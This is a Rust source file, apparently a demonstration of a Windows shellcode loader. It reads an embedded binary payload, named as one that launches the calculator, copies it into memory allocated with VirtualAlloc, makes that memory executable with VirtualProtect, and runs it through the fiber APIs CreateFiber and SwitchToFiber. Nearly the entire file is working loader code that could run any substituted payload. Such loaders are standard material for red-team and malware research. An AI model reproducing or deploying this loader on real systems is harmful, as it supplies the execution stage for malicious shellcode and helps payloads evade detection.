use std::mem::transmute;
use std::ptr::{copy, null};
use windows_sys::Win32::Foundation::{GetLastError, FALSE};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{ConvertThreadToFiber, CreateFiber, SwitchToFiber};

#[cfg(target_os = "windows")]
fn main() {
    let shellcode = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
    let shellcode_size = shellcode.len();

    unsafe {
        let main_fiber = ConvertThreadToFiber(null());
        if main_fiber.is_null() {
            panic!("[-]ConvertThreadToFiber failed: {}!", GetLastError());
        }

        let addr = VirtualAlloc(
            null(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            panic!("[-]VirtualAlloc failed: {}!", GetLastError());
        }

        let mut old = PAGE_READWRITE;
        copy(shellcode.as_ptr(), addr.cast(), shellcode_size);
        let res = VirtualProtect(addr, shellcode_size, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            panic!("[-]VirtualProtect failed: {}!", GetLastError());
        }

        let func = transmute(addr);
        let fiber = CreateFiber(0, func, null());
        if fiber.is_null() {
            panic!("[-]CreateFiber failed: {}!", GetLastError());
        }

        SwitchToFiber(fiber);
        SwitchToFiber(main_fiber);
    }
}
